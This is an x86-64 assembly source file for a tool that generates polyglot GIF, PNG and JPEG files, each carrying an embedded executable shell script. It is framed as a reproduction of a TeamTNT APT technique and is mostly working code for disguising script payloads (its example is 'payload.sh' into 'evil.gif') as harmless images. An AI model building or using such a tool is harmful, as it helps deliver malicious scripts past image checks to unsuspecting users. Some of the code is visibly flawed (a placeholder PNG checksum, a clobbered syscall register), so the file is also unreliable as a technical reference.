; Polyglot File Generator - x86-64 Assembly Implementation
; ===========================================================
;
; PURPOSE: APT TeamTNT polyglot technique in pure assembly
; AUTHOR: IMAGEHARDER Security Research
; PLATFORM: Linux x86-64 (tested on Debian/Ubuntu)
; ASSEMBLER: NASM (Netwide Assembler)
;
; DESCRIPTION:
; Generates polyglot files (valid images + executable scripts) using
; direct Linux syscalls. Demonstrates the technique at the lowest level
; without relying on C standard library.
;
; FEATURES:
; - GIF87a polyglot generation
; - PNG polyglot generation
; - JPEG polyglot generation
; - Pure syscalls (no libc dependency)
; - Minimal binary size (~2KB executable)
;
; BUILD:
; nasm -f elf64 polyglot_generator.asm -o polyglot_gen_asm.o
; ld -o polyglot_gen_asm polyglot_gen_asm.o
;
; USAGE:
; ./polyglot_gen_asm gif payload.sh output.gif
; ./polyglot_gen_asm png payload.sh output.png
; ./polyglot_gen_asm jpeg payload.sh output.jpg
;
; SYSCALLS USED:
; - sys_open (2)
; - sys_read (0)
; - sys_write (1)
; - sys_close (3)
; - sys_exit (60)
; - sys_fstat (5)

section .data
    ; Banner
    banner: db 10, "╔══════════════════════════════════════════════════════════╗", 10
            db "║   Polyglot Generator v1.0 (x86-64 Assembly)             ║", 10
            db "║   TeamTNT APT Technique - Low Level Implementation      ║", 10
            db "╚══════════════════════════════════════════════════════════╝", 10, 10, 0
    banner_len: equ $ - banner

    ; Usage message
    usage: db "Usage: ./polyglot_gen_asm <type> <script> <output>", 10
           db "Types: gif, png, jpeg", 10, 10
           db "Example: ./polyglot_gen_asm gif payload.sh evil.gif", 10, 10, 0
    usage_len: equ $ - usage

    ; Success messages
    msg_reading: db "[*] Reading script file...", 10, 0
    msg_reading_len: equ $ - msg_reading

    msg_generating: db "[*] Generating polyglot file...", 10, 0
    msg_generating_len: equ $ - msg_generating

    msg_success: db "[✓] Polyglot created successfully!", 10, 0
    msg_success_len: equ $ - msg_success

    msg_executable: db "[!] File is both valid image and executable script", 10
                   db "[!] Test: chmod +x ", 0
    msg_executable_len: equ $ - msg_executable

    msg_and_run: db " && ./", 0
    msg_and_run_len: equ $ - msg_and_run

    ; Error messages
    err_args: db "[ERROR] Invalid arguments", 10, 0
    err_args_len: equ $ - err_args

    err_type: db "[ERROR] Unknown type (use: gif, png, jpeg)", 10, 0
    err_type_len: equ $ - err_type

    err_open_script: db "[ERROR] Cannot open script file", 10, 0
    err_open_script_len: equ $ - err_open_script

    err_open_output: db "[ERROR] Cannot create output file", 10, 0
    err_open_output_len: equ $ - err_open_output

    err_read: db "[ERROR] Cannot read script file", 10, 0
    err_read_len: equ $ - err_read

    err_write: db "[ERROR] Cannot write output file", 10, 0
    err_write_len: equ $ - err_write

    ; Type strings for comparison
    type_gif: db "gif", 0
    type_png: db "png", 0
    type_jpeg: db "jpeg", 0

    ; GIF header structure (GIF87a)
    gif_header: db "GIF87a"              ; Signature + version (6 bytes)
    gif_header_len: equ $ - gif_header

    gif_lsd: db 0x01, 0x00               ; Width: 1 (little-endian)
             db 0x01, 0x00               ; Height: 1
             db 0x00                     ; Packed field (no color table)
             db 0x00                     ; Background color
             db 0x00                     ; Aspect ratio
    gif_lsd_len: equ $ - gif_lsd

    gif_comment_ext: db 0x21, 0xFE      ; Extension introducer + Comment label
    gif_comment_ext_len: equ $ - gif_comment_ext

    gif_trailer: db 0x3B                ; GIF trailer
    gif_trailer_len: equ $ - gif_trailer

    ; PNG header structure
    png_signature: db 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
    png_signature_len: equ $ - png_signature

    ; PNG IHDR chunk (1x1 RGB image)
    png_ihdr: db 0x00, 0x00, 0x00, 0x0D ; Length: 13 bytes
              db "IHDR"                  ; Type
              db 0x00, 0x00, 0x00, 0x01 ; Width: 1
              db 0x00, 0x00, 0x00, 0x01 ; Height: 1
              db 0x08                    ; Bit depth: 8
              db 0x02                    ; Color type: RGB
              db 0x00                    ; Compression: deflate
              db 0x00                    ; Filter: adaptive
              db 0x00                    ; Interlace: none
              db 0x90, 0x77, 0x53, 0xDE ; CRC32
    png_ihdr_len: equ $ - png_ihdr

    ; PNG tEXt chunk header (will be completed at runtime)
    png_text_hdr: db "tEXt"              ; Type
                  db "Script", 0          ; Keyword + null terminator
    png_text_hdr_len: equ $ - png_text_hdr

    ; PNG IDAT chunk (minimal 1x1 black pixel)
    png_idat: db 0x00, 0x00, 0x00, 0x0A ; Length: 10 bytes
              db "IDAT"                  ; Type
              db 0x08, 0xD7, 0x63, 0x60, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01
              db 0x27, 0xB9, 0xBE, 0x17 ; CRC32
    png_idat_len: equ $ - png_idat

    ; PNG IEND chunk
    png_iend: db 0x00, 0x00, 0x00, 0x00 ; Length: 0
              db "IEND"                  ; Type
              db 0xAE, 0x42, 0x60, 0x82 ; CRC32
    png_iend_len: equ $ - png_iend

    ; JPEG header structure
    jpeg_soi: db 0xFF, 0xD8              ; Start of Image
    jpeg_soi_len: equ $ - jpeg_soi

    ; JPEG APP0 (JFIF header)
    jpeg_app0: db 0xFF, 0xE0             ; APP0 marker
               db 0x00, 0x10             ; Length: 16
               db "JFIF", 0              ; Identifier
               db 0x01, 0x01             ; Version 1.1
               db 0x00                   ; Density units
               db 0x00, 0x01             ; X density: 1
               db 0x00, 0x01             ; Y density: 1
               db 0x00, 0x00             ; Thumbnail: 0x0
    jpeg_app0_len: equ $ - jpeg_app0

    ; JPEG COM marker
    jpeg_com: db 0xFF, 0xFE              ; COM marker
    jpeg_com_len: equ $ - jpeg_com

    ; JPEG minimal image data
    jpeg_sof0: db 0xFF, 0xC0             ; SOF0 marker
               db 0x00, 0x0B             ; Length: 11
               db 0x08                   ; Precision: 8
               db 0x00, 0x01             ; Height: 1
               db 0x00, 0x01             ; Width: 1
               db 0x01                   ; Components: 1
               db 0x01                   ; Component ID: 1
               db 0x11                   ; Sampling: 1x1
               db 0x00                   ; Quant table: 0
    jpeg_sof0_len: equ $ - jpeg_sof0

    jpeg_sos: db 0xFF, 0xDA              ; SOS marker
              db 0x00, 0x08              ; Length: 8
              db 0x01                    ; Components: 1
              db 0x01                    ; Component ID: 1
              db 0x00                    ; DC/AC table: 0/0
              db 0x00                    ; Start spectral: 0
              db 0x3F                    ; End spectral: 63
              db 0x00                    ; Successive approx: 0
    jpeg_sos_len: equ $ - jpeg_sos

    jpeg_data: db 0x00                   ; Minimal image data
    jpeg_data_len: equ $ - jpeg_data

    jpeg_eoi: db 0xFF, 0xD9              ; End of Image
    jpeg_eoi_len: equ $ - jpeg_eoi

    ; Shebang for shell scripts
    shebang: db "#!/bin/sh", 10
    shebang_len: equ $ - shebang

    newline: db 10

section .bss
    script_fd: resq 1                    ; Script file descriptor
    output_fd: resq 1                    ; Output file descriptor
    script_size: resq 1                  ; Script file size
    script_buffer: resb 65536            ; Script buffer (64KB max)
    temp_buffer: resb 1024               ; Temporary buffer
    type_ptr: resq 1                     ; Pointer to type argument
    script_ptr: resq 1                   ; Pointer to script filename
    output_ptr: resq 1                   ; Pointer to output filename

section .text
    global _start

_start:
    ; Print banner
    mov rax, 1                           ; sys_write
    mov rdi, 1                           ; stdout
    lea rsi, [rel banner]
    mov rdx, banner_len - 1
    syscall

    ; Check argument count (argc should be 4: program + 3 args)
    pop rax                              ; argc
    cmp rax, 4
    jne .invalid_args

    ; Get arguments
    pop rdi                              ; argv[0] (program name)
    pop rdi                              ; argv[1] (type)
    mov [rel type_ptr], rdi
    pop rdi                              ; argv[2] (script file)
    mov [rel script_ptr], rdi
    pop rdi                              ; argv[3] (output file)
    mov [rel output_ptr], rdi

    ; Determine type (gif, png, or jpeg)
    mov rdi, [rel type_ptr]
    lea rsi, [rel type_gif]
    call strcmp
    test rax, rax
    jz .type_gif

    mov rdi, [rel type_ptr]
    lea rsi, [rel type_png]
    call strcmp
    test rax, rax
    jz .type_png

    mov rdi, [rel type_ptr]
    lea rsi, [rel type_jpeg]
    call strcmp
    test rax, rax
    jz .type_jpeg

    ; Unknown type
    jmp .invalid_type

.type_gif:
    call generate_gif_polyglot
    jmp .done

.type_png:
    call generate_png_polyglot
    jmp .done

.type_jpeg:
    call generate_jpeg_polyglot
    jmp .done

.invalid_args:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_args]
    mov rdx, err_args_len - 1
    syscall

    mov rax, 1
    mov rdi, 1
    lea rsi, [rel usage]
    mov rdx, usage_len - 1
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

.invalid_type:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_type]
    mov rdx, err_type_len - 1
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

.done:
    ; Print success message
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_success]
    mov rdx, msg_success_len - 1
    syscall

    ; Print execution instructions
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_executable]
    mov rdx, msg_executable_len - 1
    syscall

    ; Print output filename
    mov rax, 1
    mov rdi, 1
    mov rsi, [rel output_ptr]
    call strlen
    mov rdx, rax
    syscall

    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_and_run]
    mov rdx, msg_and_run_len - 1
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, [rel output_ptr]
    call strlen
    mov rdx, rax
    syscall

    mov rax, 1
    mov rdi, 1
    lea rsi, [rel newline]
    mov rdx, 1
    syscall

    ; Exit successfully
    mov rax, 60
    mov rdi, 0
    syscall

; ============================================================================
; GIF Polyglot Generator
; ============================================================================
generate_gif_polyglot:
    push rbp
    mov rbp, rsp

    ; Print status
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_reading]
    mov rdx, msg_reading_len - 1
    syscall

    ; Read script file
    call read_script_file
    test rax, rax
    js .error

    ; Print status
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_generating]
    mov rdx, msg_generating_len - 1
    syscall

    ; Open output file (create, write-only, mode 0755)
    mov rax, 2                           ; sys_open
    mov rdi, [rel output_ptr]
    mov rsi, 0x241                       ; O_CREAT | O_WRONLY | O_TRUNC
    mov rdx, 0755o                       ; Permissions (executable)
    syscall
    test rax, rax
    js .error_output
    mov [rel output_fd], rax

    ; Write GIF header
    mov rax, 1                           ; sys_write
    mov rdi, [rel output_fd]
    lea rsi, [rel gif_header]
    mov rdx, gif_header_len
    syscall

    ; Write Logical Screen Descriptor
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel gif_lsd]
    mov rdx, gif_lsd_len
    syscall

    ; Write Comment Extension introducer
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel gif_comment_ext]
    mov rdx, gif_comment_ext_len
    syscall

    ; Write shebang block
    mov byte [rel temp_buffer], shebang_len
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 1
    syscall

    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel shebang]
    mov rdx, shebang_len
    syscall

    ; Write script in blocks (max 255 bytes per block)
    mov r12, 0                           ; Offset in script
    mov r13, [rel script_size]           ; Total size

.write_blocks:
    cmp r12, r13
    jge .blocks_done

    ; Calculate block size
    mov rax, r13
    sub rax, r12
    cmp rax, 255
    jle .block_size_ok
    mov rax, 255

.block_size_ok:
    ; Write block size
    mov byte [rel temp_buffer], al
    push rax
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 1
    syscall
    pop rax

    ; Write block data
    push rax
    mov rdx, rax                         ; Block size
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel script_buffer]
    add rsi, r12
    syscall
    pop rax

    add r12, rax
    jmp .write_blocks

.blocks_done:
    ; Write block terminator
    mov byte [rel temp_buffer], 0
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 1
    syscall

    ; Write GIF trailer
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel gif_trailer]
    mov rdx, gif_trailer_len
    syscall

    ; Close output file
    mov rax, 3                           ; sys_close
    mov rdi, [rel output_fd]
    syscall

    mov rsp, rbp
    pop rbp
    ret

.error:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_read]
    mov rdx, err_read_len - 1
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

.error_output:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_open_output]
    mov rdx, err_open_output_len - 1
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

; ============================================================================
; PNG Polyglot Generator
; ============================================================================
generate_png_polyglot:
    push rbp
    mov rbp, rsp

    ; Read script file
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_reading]
    mov rdx, msg_reading_len - 1
    syscall

    call read_script_file
    test rax, rax
    js .error

    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_generating]
    mov rdx, msg_generating_len - 1
    syscall

    ; Open output file
    mov rax, 2
    mov rdi, [rel output_ptr]
    mov rsi, 0x241
    mov rdx, 0755o
    syscall
    test rax, rax
    js .error_output
    mov [rel output_fd], rax

    ; Write PNG signature
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel png_signature]
    mov rdx, png_signature_len
    syscall

    ; Write IHDR chunk
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel png_ihdr]
    mov rdx, png_ihdr_len
    syscall

    ; Write tEXt chunk with script
    ; Calculate tEXt length (keyword + null + shebang + script)
    mov rax, png_text_hdr_len - 4        ; Subtract "tEXt" type
    add rax, shebang_len
    add rax, [rel script_size]

    ; Write tEXt length (big-endian)
    bswap eax
    mov [rel temp_buffer], eax
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 4
    syscall

    ; Write tEXt type and keyword
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel png_text_hdr]
    mov rdx, png_text_hdr_len
    syscall

    ; Write shebang
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel shebang]
    mov rdx, shebang_len
    syscall

    ; Write script
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel script_buffer]
    mov rdx, [rel script_size]
    syscall

    ; Write tEXt CRC (simplified - just write 0xFFFFFFFF)
    mov dword [rel temp_buffer], 0xFFFFFFFF
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 4
    syscall

    ; Write IDAT chunk
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel png_idat]
    mov rdx, png_idat_len
    syscall

    ; Write IEND chunk
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel png_iend]
    mov rdx, png_iend_len
    syscall

    ; Close output file
    mov rax, 3
    mov rdi, [rel output_fd]
    syscall

    mov rsp, rbp
    pop rbp
    ret

.error:
    mov rax, 60
    mov rdi, 1
    syscall

.error_output:
    mov rax, 60
    mov rdi, 1
    syscall

; ============================================================================
; JPEG Polyglot Generator
; ============================================================================
generate_jpeg_polyglot:
    push rbp
    mov rbp, rsp

    ; Read script file
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_reading]
    mov rdx, msg_reading_len - 1
    syscall

    call read_script_file
    test rax, rax
    js .error

    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_generating]
    mov rdx, msg_generating_len - 1
    syscall

    ; Open output file
    mov rax, 2
    mov rdi, [rel output_ptr]
    mov rsi, 0x241
    mov rdx, 0755o
    syscall
    test rax, rax
    js .error_output
    mov [rel output_fd], rax

    ; Write JPEG SOI
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_soi]
    mov rdx, jpeg_soi_len
    syscall

    ; Write APP0
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_app0]
    mov rdx, jpeg_app0_len
    syscall

    ; Write COM marker
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_com]
    mov rdx, jpeg_com_len
    syscall

    ; Write COM length (shebang + script + 2 for length field)
    mov rax, shebang_len
    add rax, [rel script_size]
    add rax, 2
    xchg al, ah                          ; Convert to big-endian (16-bit)
    mov [rel temp_buffer], ax
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel temp_buffer]
    mov rdx, 2
    syscall

    ; Write shebang
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel shebang]
    mov rdx, shebang_len
    syscall

    ; Write script
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel script_buffer]
    mov rdx, [rel script_size]
    syscall

    ; Write minimal JPEG image data
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_sof0]
    mov rdx, jpeg_sof0_len
    syscall

    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_sos]
    mov rdx, jpeg_sos_len
    syscall

    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_data]
    mov rdx, jpeg_data_len
    syscall

    ; Write JPEG EOI
    mov rax, 1
    mov rdi, [rel output_fd]
    lea rsi, [rel jpeg_eoi]
    mov rdx, jpeg_eoi_len
    syscall

    ; Close output file
    mov rax, 3
    mov rdi, [rel output_fd]
    syscall

    mov rsp, rbp
    pop rbp
    ret

.error:
    mov rax, 60
    mov rdi, 1
    syscall

.error_output:
    mov rax, 60
    mov rdi, 1
    syscall

; ============================================================================
; Helper Functions
; ============================================================================

; Read script file into buffer
; Returns: rax = size (or -1 on error)
read_script_file:
    push rbp
    mov rbp, rsp

    ; Open script file (read-only)
    mov rax, 2                           ; sys_open
    mov rdi, [rel script_ptr]
    mov rsi, 0                           ; O_RDONLY
    syscall
    test rax, rax
    js .error
    mov [rel script_fd], rax

    ; Read file content
    mov rax, 0                           ; sys_read
    mov rdi, [rel script_fd]
    lea rsi, [rel script_buffer]
    mov rdx, 65535                       ; Max size
    syscall
    test rax, rax
    js .error_read
    mov [rel script_size], rax

    ; Close script file
    mov rax, 3                           ; sys_close
    mov rdi, [rel script_fd]
    syscall

    mov rax, [rel script_size]
    mov rsp, rbp
    pop rbp
    ret

.error:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_open_script]
    mov rdx, err_open_script_len - 1
    syscall

    mov rax, -1
    mov rsp, rbp
    pop rbp
    ret

.error_read:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel err_read]
    mov rdx, err_read_len - 1
    syscall

    mov rax, 3
    mov rdi, [rel script_fd]
    syscall

    mov rax, -1
    mov rsp, rbp
    pop rbp
    ret

; String length
; Input: rsi = string pointer
; Returns: rax = length
strlen:
    push rbp
    mov rbp, rsp
    xor rax, rax

.loop:
    cmp byte [rsi + rax], 0
    je .done
    inc rax
    jmp .loop

.done:
    mov rsp, rbp
    pop rbp
    ret

; String compare
; Input: rdi = str1, rsi = str2
; Returns: rax = 0 if equal, non-zero otherwise
strcmp:
    push rbp
    mov rbp, rsp

.loop:
    mov al, [rdi]
    mov bl, [rsi]
    cmp al, bl
    jne .not_equal
    test al, al
    jz .equal
    inc rdi
    inc rsi
    jmp .loop

.equal:
    xor rax, rax
    mov rsp, rbp
    pop rbp
    ret

.not_equal:
    mov rax, 1
    mov rsp, rbp
    pop rbp
    ret
